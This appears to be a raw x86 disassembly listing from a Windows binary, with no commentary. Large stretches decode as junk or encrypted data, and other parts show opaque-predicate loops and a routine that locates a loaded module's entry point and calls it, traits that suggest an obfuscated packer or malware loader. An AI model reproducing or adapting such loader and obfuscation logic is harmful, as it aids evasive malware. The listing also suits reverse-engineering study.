  4111bf:	cs lock xchg esi,eax
  4111c2:	imul   esp,DWORD PTR [ebx],0xffffffd8
  4111c5:	in     eax,dx
  4111c6:	stos   DWORD PTR es:[edi],eax
  4111c7:	jno    0x4111d0
  4111c9:	cs ss cmp eax,0x42053e8d
  4111d0:	arpl   WORD PTR [eax],bx
  4111d2:	add    ecx,ebx
  4111d4:	ret    
  4111d5:	ror    DWORD PTR [ebx+0x6d7c2483],cl
  4111db:	push   0x11b742e6
  4111e0:	mov    bh,BYTE PTR [ecx-0x1c1cdddd]
  4111e6:	stc    
  4111e7:	rcr    BYTE PTR [ebx+0x3b],0xc4
  4111eb:	ret    0xc5db
  4111ee:	sbb    bl,BYTE PTR [ebx]
  4111f0:	out    0x70,al
  4111f2:	or     ah,dl
  4111f4:	mov    ebx,DWORD PTR [edi]
  4111f6:	adc    BYTE PTR [edi-0x38],al
  4111f9:	dec    esi
  4111fa:	jbe    0x41121d
  4111fc:	enter  0x8d56,0x49
  411200:	fiadd  WORD PTR [edx+0x5712f350]
  411206:	setbe  ch
  411209:	in     eax,dx
  41120a:	ficomp DWORD PTR [eax+0x55]
  41120d:	mov    edi,0xbcc06135
  411212:	div    esp
  411214:	push   es
  411215:	xor    dl,BYTE PTR ds:0xf49595f7
  41121b:	shl    DWORD PTR [ebp-0x59],cl
  41121e:	jbe    0x411216
  411220:	out    0x2a,eax
  411222:	mov    bh,0xc8
  411224:	stos   DWORD PTR es:[edi],eax
  411225:	and    al,BYTE PTR [ebp-0x3bcea410]
  41122b:	sbb    al,0xc4
  41122d:	(bad)  
  41122e:	ins    BYTE PTR es:[edi],dx
  41122f:	ins    BYTE PTR es:[edi],dx
  411230:	mov    BYTE PTR [eax-0xa],ah
  411233:	addr16 inc ebx
  411235:	fwait
  411236:	xchg   edi,eax
  411237:	and    bh,BYTE PTR [esi]
  411239:	sub    DWORD PTR [esi-0x5f608f3e],0xbb7c1b8
  411243:	leave  
  411244:	mov    ds:0x420a9a0f,eax
  411249:	enter  0xe3c7,0xfa
  41124d:	dec    ebx
  41124e:	mov    bx,WORD PTR [ebp-0xd]
  411252:	pop    ebx
  411253:	fcmovu st,st(4)
  411255:	ret    
  411256:	(bad)  
  411257:	dec    esi
  411258:	jo     0x4111eb
  41125a:	jl     0x4111e0
  41125c:	mov    ds:0xaa42ec35,al
  411261:	enter  0x190c,0x42
  411265:	mov    edx,0x6f9af808
  41126a:	(bad)
  41126d:	xchg   edi,eax
  41126e:	mov    edx,DWORD PTR [edi-0x3ed0601b]
  411274:	dec    ebx
  411275:	cli    
  411276:	iret   
  411277:	jmp    0x4112a6
  411279:	pop    ebx
  41127a:	mov    al,ds:0xaa948109
  41127f:	jp     0x411244
  411281:	and    eax,0xd5850696
  411286:	and    DWORD PTR [eax+0x5a],edi
  411289:	icebp  
  41128a:	xchg   esi,eax
  41128b:	xor    DWORD PTR [ecx-0x5bb5ccfa],ebp
  411291:	(bad)  
  411292:	mov    bh,0xcd
  411294:	add    bh,BYTE PTR [edx+edx*8-0x42]
  411298:	ins    BYTE PTR es:[edi],dx
  411299:	inc    edi
  41129a:	ins    DWORD PTR es:[edi],dx
  41129b:	stos   BYTE PTR es:[edi],al
  41129c:	into   
  41129d:	leave  
  41129e:	scas   eax,DWORD PTR es:[edi]
  41129f:	inc    edi
  4112a0:	and    al,0xc3
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	adc    DWORD PTR [ebp-0x6],esi
  4112a6:	mov    dl,0x48
  4112a8:	or     al,0xd7
  4112aa:	retf   0x2fad
  4112ad:	data16 or BYTE PTR [ecx-0x3d],dh
  4112b1:	inc    ecx
  4112b2:	or     dl,ch
  4112b4:	test   DWORD PTR [ebx-0x15c01ca7],0x198246f0
  4112be:	adc    dh,BYTE PTR [edi-0x67]
  4112c1:	addr16 mov ch,0x52
  4112c4:	in     eax,0x19
  4112c6:	sub    al,0xa4
  4112c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112c9:	enter  0x6b8b,0xf4
  4112cd:	or     eax,0x11307b43
  4112d2:	out    0xef,eax
  4112d4:	or     al,0xd0
  4112d6:	(bad)  
  4112d8:	mov    ds:0xcf25d405,al
  4112dd:	pop    es
  4112de:	mov    ch,0x61
  4112e0:	ficomp WORD PTR [edi+0x2c]
  4112e3:	sbb    al,0xd0
  4112e5:	push   es
  4112e6:	add    eax,0xf033aa6f
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434783
  411346:	xor    DWORD PTR ds:0x43474f,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x43467f,0x14
  41135d:	cmp    DWORD PTR ds:0x43467f,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x43467f,0x3
  411371:	jne    0x411387
  411377:	push   0x4348fa
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x43467f,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x43467f
  411399:	dec    eax
  41139a:	mov    ds:0x43467f,eax
  41139f:	mov    eax,ds:0x43467f
  4113a4:	dec    eax
  4113a5:	mov    ds:0x43467f,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x43466f,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x4346c3,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x4346c3
  4113d0:	inc    eax
  4113d1:	mov    ds:0x4346c3,eax
  4113d6:	cmp    DWORD PTR ds:0x4346c3,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x4346c3,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x4346ff
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x4346c3,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x4346c3
  411418:	inc    eax
  411419:	mov    ds:0x4346c3,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43478f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43478f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43478f,ebx
  411442:	cmp    DWORD PTR ds:0x43478f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434713
  411457:	push   0x43485b
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43478f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43478f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43478f,ebx
  41147c:	cmp    DWORD PTR ds:0x43478f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x43465f
  411490:	adc    DWORD PTR ds:0x434747,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434703,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434783,0x434667
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x434753,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x434777,0x434673
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x43474b,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x43467f,0x4346bf
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434793,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x43467f,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x43467f
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x43467f,edi
  411509:	cmp    DWORD PTR ds:0x43467f,0xb
  411510:	jne    0x411529
  411516:	push   0x434787
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x43467f,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x43467f
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x43467f,edi
  411545:	cmp    DWORD PTR ds:0x43467f,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x434667,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x434677,0x1a
  411569:	cmp    DWORD PTR ds:0x434677,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x434677,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x434677,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x434677
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x434677,edi
  4115ac:	mov    edi,DWORD PTR ds:0x434677
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x434677,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x43466b
  4115c4:	adc    DWORD PTR ds:0x434663,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43478b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43478b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43478b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43478b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43478b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43478b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43478b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43478b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4116b2
  411641:	and    BYTE PTR [ebx],dh
  411643:	add    eax,0x7e7e4a8f
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4116a0
  41164d:	xchg   esi,eax
  41164e:	(bad)  
  41164f:	pop    ss
  411650:	in     eax,dx
  411651:	or     BYTE PTR [ecx+0x45b00e02],bl
  411657:	out    dx,al
  411658:	xor    DWORD PTR [edx-0x1e],ecx
  41165b:	xchg   edx,eax
  41165c:	nop
  41165d:	in     eax,dx
  41165e:	clc    
  41165f:	xchg   ecx,eax
  411660:	jecxz  0x4116c9
  411662:	cmp    cl,BYTE PTR [edx-0x3c]
  411665:	stos   BYTE PTR es:[edi],al
  411666:	repnz sub al,BYTE PTR [eax-0x18247322]
  41166d:	push   es
  41166e:	add    eax,edx
  411670:	sub    al,0x4d
  411672:	or     ebp,DWORD PTR [ebp-0x337786b6]
  411678:	push   esi
  411679:	jge    0x4116c4
  41167b:	outs   dx,DWORD PTR ds:[esi]
  41167c:	gs mov al,0xeb
  41167f:	xor    bl,BYTE PTR [ecx+0x40]
  411682:	(bad)  
  411684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411685:	(bad)  [eax]
  411687:	and    BYTE PTR [edi+0x401287d],al
  41168d:	inc    edi
  41168e:	push   es
  41168f:	jae    0x411659
  411691:	push   es
  411692:	mov    edi,0x41284be5
  411697:	(bad)  
  411698:	sbb    eax,DWORD PTR [edx-0x6399699]
  41169e:	cli    
  41169f:	fwait
  4116a0:	sub    al,0x91
  4116a2:	push   0x148adcae
  4116a7:	out    dx,al
  4116a8:	pop    edi
  4116a9:	int3   
  4116aa:	pop    ebx
  4116ab:	xchg   edx,eax
  4116ac:	pop    ds
  4116ad:	inc    ecx
  4116ae:	sbb    eax,0x37b3288a
  4116b3:	push   esp
  4116b4:	(bad)  
  4116b5:	jbe    0x4116cd
  4116b7:	aam    0x51
  4116b9:	cmp    DWORD PTR [ebx-0x1efcbd3f],ebp
  4116bf:	mov    ebx,0x5403e760
  4116c4:	and    ah,al
  4116c6:	stos   BYTE PTR es:[edi],al
  4116c7:	lods   al,BYTE PTR ds:[esi]
  4116c8:	mov    es,esp
  4116ca:	(bad)  
  4116cb:	in     al,0x89
  4116cd:	stc    
  4116ce:	rol    ebx,0x42
  4116d1:	push   ds
  4116d2:	fsub   QWORD PTR [eax-0x35924177]
  4116d8:	xor    BYTE PTR [eax-0x6c],dl
  4116db:	mov    esp,0xf0277878
  4116e0:	push   ds
  4116e1:	lea    esi,[eax-0xe]
  4116e4:	sbb    al,BYTE PTR [esi-0x699f60f2]
  4116ea:	mov    esi,0x3c0b33a9
  4116ef:	aas    
  4116f0:	sar    DWORD PTR [edx-0x77],cl
  4116f3:	cmc    
  4116f4:	mov    ebp,0xa6fc1469
  4116f9:	push   ebp
  4116fa:	pop    edx
  4116fb:	test   eax,0xed2c510
  411700:	mov    bl,0x40
  411702:	mov    edx,0xa835169
  411707:	push   cs
  411708:	es mov ch,dl
  41170b:	and    al,ah
  41170d:	pop    ds
  41170e:	(bad)  
  41170f:	and    dl,ch
  411711:	lahf   
  411712:	sbb    al,0x5c
  411714:	(bad)
  411717:	pop    ebx
  411718:	nop
  411719:	(bad)  
  41171a:	gs pop esp
  41171c:	iret   
  41171d:	int    0x1b
  41171f:	enter  0x2fb,0x6a
  411723:	cmp    al,0x44
  411725:	xchg   dl,ch
  411727:	test   BYTE PTR [edi-0x37],dl
  41172a:	sbb    eax,0x7df10de2
  41172f:	add    al,0x64
  411731:	jnp    0x91d82e55
  411737:	jp     0x411707
  411739:	sub    dl,BYTE PTR [eax-0x5572a1dc]
  41173f:	test   al,0x39
  411741:	and    eax,0x3b5ff467
  411746:	pop    ecx
  411747:	xor    ecx,DWORD PTR [ecx+ecx*8-0x20]
  41174b:	jbe    0x41176e
  41174d:	outs   dx,DWORD PTR ds:[esi]
  41174e:	push   edx
  41174f:	(bad)  
  411750:	inc    ebx
  411751:	or     DWORD PTR [ecx-0x6c],edi
  411754:	mov    esi,0x61d107d6
  411759:	cld    
  41175a:	loop   0x411703
  41175c:	pushf  
  41175d:	imul   ebp,DWORD PTR [ecx-0x4d],0x16906141
  411764:	xor    dh,ch
  411766:	out    dx,al
  411767:	std    
  411768:	test   al,0x2
  41176a:	add    dh,bl
  41176c:	sti    
  41176d:	mov    edi,0xa9e1c31f
  411772:	out    0x26,al
  411774:	mov    DWORD PTR ds:0xc5b33688,edx
  41177a:	jmp    0x366eb342
  41177f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411780:	outs   dx,BYTE PTR ds:[esi]
  411781:	sbb    bl,BYTE PTR ds:[bp+di]
  411785:	cdq    
  411786:	jb     0x411775
  411788:	xchg   ecx,eax
  411789:	adc    DWORD PTR [eax+0x7bd344fe],0x58
  411790:	loop   0x41175b
  411792:	out    dx,al
  411793:	jl     0x41171c
  411795:	lods   eax,DWORD PTR ds:[esi]
  411796:	fs xor eax,0xe14c2d20
  41179c:	cmp    DWORD PTR [ecx+0x59],ebx
  41179f:	sbb    eax,0x7928463e
  4117a4:	or     esi,DWORD PTR [esi]
  4117a6:	ret    0xa6c0
  4117a9:	std    
  4117aa:	add    al,0x7b
  4117ac:	cmp    DWORD PTR [esp+ebx*4-0x3d5ea67c],ebp
  4117b3:	ret    
  4117b4:	push   es
  4117b5:	xchg   ecx,eax
  4117b6:	sbb    al,0x4a
  4117b8:	pop    edi
  4117b9:	imul   ebp,DWORD PTR ds:0xfaffd594,0x38
  4117c0:	dec    esi
  4117c1:	fsub   st,st(2)
  4117c3:	mov    edx,0xd593ad58
  4117c8:	imul   eax,DWORD PTR ss:0x894b8946,0x8585490d
  4117d3:	test   edi,edi
  4117d5:	stc    
  4117d6:	sub    ecx,edi
  4117d8:	daa    
  4117d9:	adc    eax,edx
  4117db:	inc    ebp
  4117dc:	inc    esi
  4117dd:	push   esi
  4117de:	stos   BYTE PTR es:[edi],al
  4117df:	jo     0x4117cb
  4117e1:	cmp    eax,0xa7318631
  4117e6:	mov    dl,0xbe
  4117e8:	addr16 push esi
  4117ea:	or     al,0x4b
  4117ec:	inc    ebp
  4117ed:	dec    edx
  4117ee:	stc    
  4117ef:	push   esi
  4117f0:	shufps xmm7,XMMWORD PTR [edi+0x30a57c94],0x5b
  4117f8:	mov    ds:0xa6a33f22,al
  4117fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117fe:	jno    0x411869
  411800:	jle    0x4117c0
  411802:	ror    dh,0x54
  411805:	cmp    BYTE PTR [edx-0x4925a07],0x4b
  41180c:	aas    
  41180d:	cmc    
  41180e:	mov    edi,0x92cfdf6b
  411813:	dec    esi
  411814:	stos   BYTE PTR es:[edi],al
  411815:	xor    DWORD PTR [ecx+0x5a31b21e],edx
  41181b:	(bad)  
  41181c:	shr    bl,0x36
  41181f:	add    al,0xf2
  411821:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411823:	les    ecx,FWORD PTR [eax+0x6d]
  411826:	popf   
  411827:	imul   esp,DWORD PTR [esi],0xac26e29f
  41182d:	push   ds
  41182e:	cs mov esi,0x7879
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	sbb    dl,BYTE PTR [edx-0x3f]
  411853:	sub    edx,0x597e7e54
  411859:	jg     0x4118d9
  41185b:	jle    0x41186b
  41185d:	jb     0x4118d5
  41185f:	inc    edx
  411860:	pop    edi
  411861:	dec    edi
  411862:	fstp   DWORD PTR [eax-0x7af17d43]
  411868:	nop
  411869:	xor    eax,0x5f4ede35
  41186e:	in     al,0x70
  411870:	xor    eax,0x39c32839
  411875:	cmp    ebp,ebx
  411877:	neg    BYTE PTR [esi]
  411879:	mov    DWORD PTR [edx-0x19],0x6dd1e488
  411880:	or     cl,BYTE PTR [eax-0x58]
  411883:	(bad)  
  411884:	(bad)  
  411886:	and    al,0xbc
  411888:	jmp    0x4118e7
  41188a:	dec    ebp
  41188b:	sub    dh,BYTE PTR [edx-0x2f]
  41188e:	jmp    0xaf078b18
  411893:	push   0x49b6cbdc
  411898:	cmc    
  411899:	les    ecx,FWORD PTR [ecx+0x31]
  41189c:	nop
  41189d:	imul   esp,esi,0xfde0f808
  4118a3:	test   al,0x5
  4118a5:	jle    0x4118ec
  4118a7:	(bad)  
  4118a9:	enter  0x5f6a,0x85
  4118ad:	jmp    0x4118c6
  4118af:	xor    eax,0xe096540d
  4118b4:	cmc    
  4118b5:	leave  
  4118b6:	jmp    0x47f2:0x1c211c7
  4118bd:	aad    0x2f
  4118bf:	pushf  
  4118c0:	mov    ebx,0x6a1f6454
  4118c5:	je     0x4118ab
  4118c7:	test   DWORD PTR [ebx-0x3f],esi
  4118ca:	int    0x68
  4118cc:	cmp    eax,DWORD PTR [edx]
  4118ce:	adc    eax,0xf26184e4
  4118d3:	add    cl,BYTE PTR [ecx+0x33]
  4118d6:	mov    esp,0xf85c43ad
  4118db:	sub    BYTE PTR [edx+0xa11cfb1],ch
  4118e1:	sub    BYTE PTR [ebx-0x23bdf5a2],bl
  4118e7:	jmp    0xe014:0xac74
  4118ed:	push   ebx
  4118ee:	mov    al,ds:0x93b17414
  4118f3:	pop    ecx
  4118f4:	jmp    0x4118bb
  4118f6:	or     bl,al
  4118f8:	out    0x53,al
  4118fa:	mov    cl,0x53
  4118fc:	sti    
  4118fd:	or     BYTE PTR [ebx],bl
  4118ff:	lock mov bh,BYTE PTR [ebx]
  411902:	cmc    
  411903:	test   al,0x93
  411905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411906:	push   esp
  411907:	push   esi
  411908:	fsub   st,st(5)
  41190a:	in     al,dx
  41190b:	lds    ebx,FWORD PTR [eax]
  41190d:	and    edi,DWORD PTR [esi-0x6249ed53]
  411913:	lock stos BYTE PTR es:[edi],al
  411915:	in     al,dx
  411916:	int3   
  411917:	adc    BYTE PTR [esi+0xd61541a],cl
  41191d:	outs   dx,DWORD PTR ds:[esi]
  41191e:	pop    es
  41191f:	xchg   esi,eax
  411920:	push   ecx
  411921:	in     eax,dx
  411922:	outs   dx,BYTE PTR ds:[esi]
  411923:	cmp    al,0x6
  411925:	retf   
  411926:	jns    0x4118c5
  411928:	popf   
  411929:	mov    dl,BYTE PTR [ebp-0x2e992431]
  41192f:	xchg   ecx,eax
  411930:	imul   DWORD PTR [ebp+0x7561504c]
  411936:	adc    BYTE PTR [esi+0x75],0x38
  41193a:	test   BYTE PTR [edi],bh
  41193c:	sahf   
  41193d:	nop
  41193e:	add    eax,ebp
  411940:	enter  0xa3af,0xa
  411944:	fdivr  QWORD PTR [edi]
  411946:	jnp    0x411906
  411948:	mov    ecx,0x63847496
  41194d:	cmp    eax,DWORD PTR gs:[ecx+edi*8]
  411951:	sub    eax,0x1e7e38da
  411956:	fidiv  DWORD PTR [edx-0x19]
  411959:	out    dx,eax
  41195a:	imul   ecx,eax,0x6b
  41195d:	cmp    eax,0x2392b913
  411962:	xor    edx,DWORD PTR [edx]
  411964:	(bad)  
  411965:	mov    edi,DWORD PTR [ebx+ebp*1+0x4c532901]
  41196c:	lock add ecx,eax
  41196f:	xlat   BYTE PTR ds:[ebx]
  411970:	dec    edx
  411971:	push   esp
  411972:	or     eax,0xc385bfcf
  411977:	pop    eax
  411978:	dec    esp
  411979:	cmp    ecx,DWORD PTR [esi+0x7]
  41197c:	in     al,0xa
  41197e:	push   0xf4c950bb
  411983:	aas    
  411984:	out    0x85,al
  411986:	push   0x35
  411988:	sbb    DWORD PTR [edi+0x47],ebx
  41198b:	dec    ebx
  41198c:	aam    0x3c
  41198e:	push   eax
  41198f:	imul   esp,eax,0xffffffd8
  411992:	adc    eax,0xf0595636
  411997:	sbb    BYTE PTR [esi],cl
  411999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41199a:	sub    cl,BYTE PTR [ebp-0x53a4894b]
  4119a0:	jmp    0x411970
  4119a2:	mov    edx,0x9dd8bc9
  4119a7:	pop    ecx
  4119a8:	pushf  
  4119a9:	mov    edx,cs
  4119ab:	push   eax
  4119ac:	leave  
  4119ad:	mov    edi,0xb7f7b1aa
  4119b2:	not    bh
  4119b4:	repnz pop edx
  4119b6:	fimul  DWORD PTR [edx]
  4119b8:	cmp    ebp,ebp
  4119ba:	and    eax,0xd41f8030
  4119bf:	fcom   QWORD PTR [edx]
  4119c1:	stos   DWORD PTR es:[edi],eax
  4119c2:	pop    DWORD PTR [eax-0x792c2500]
  4119c8:	adc    eax,0x3344f4d
  4119cd:	in     eax,0x34
  4119cf:	jmp    0x5584:0xe48a1dfd
  4119d6:	into   
  4119d7:	dec    edi
  4119d8:	int    0x77
  4119da:	sub    ebx,DWORD PTR [eax+0x56]
  4119dd:	sahf   
  4119de:	adc    DWORD PTR [ebp-0x57d7d14a],ebx
  4119e4:	cdq    
  4119e5:	shl    bh,0x1
  4119e8:	lods   eax,DWORD PTR ds:[esi]
  4119e9:	dec    ebx
  4119ea:	popf   
  4119eb:	mov    esi,0x456aeb7c
  4119f0:	daa    
  4119f1:	daa    
  4119f2:	sbb    ch,BYTE PTR [ecx]
  4119f4:	pushf  
  4119f5:	icebp  
  4119f6:	aas    
  4119f7:	adc    esp,DWORD PTR [ebp-0x39]
  4119fa:	out    0x30,eax
  4119fc:	sbb    edi,DWORD PTR [edi+0x5ca233f0]
  411a02:	(bad)  
  411a03:	and    al,0xac
  411a05:	jns    0x411a10
  411a07:	jmp    0x90fb:0xe4529029
  411a0e:	or     eax,0x348bfa8b
  411a13:	cmp    eax,0x9fcb354e
  411a18:	ret    0xb2c6
  411a1b:	adc    edx,DWORD PTR [edx+0x2da7d06c]
  411a21:	js     0x411a46
  411a23:	sbb    ecx,ecx
  411a25:	adc    eax,ebx
  411a27:	fbstp  TBYTE PTR [edi+esi*2-0x42]
  411a2b:	cmc    
  411a2c:	xor    esi,esi
  411a2e:	outs   dx,DWORD PTR ds:[esi]
  411a2f:	test   DWORD PTR [ecx],0x62705bf4
  411a35:	inc    edi
  411a36:	jecxz  0x411a74
  411a38:	dec    ebx
  411a39:	adc    al,0x21
  411a3b:	push   esi
  411a3c:	pop    ebp
  411a3d:	in     eax,0x8a
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x4346f7
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x434677,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x43474f
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x43474f,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x4346b7,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x43467f,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x43466b,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x4346d3,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x434743,0x4346fb
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434793,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x434673,0x434667
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43478f,0x43474b
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x4346cf
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x434737,0x0
  411b01:	mov    esi,DWORD PTR ds:0x434737
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x434737,esi
  411b0e:	cmp    DWORD PTR ds:0x434737,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x434737,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x434737,0x4346f7
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x4346b7,0x434667
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x434737
  411b6a:	and    ecx,DWORD PTR ds:0x43470b
  411b70:	mov    DWORD PTR ds:0x434737,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43478f,0x13
  411b83:	cmp    DWORD PTR ds:0x43478f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43478f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434890
  411ba2:	push   0x434835
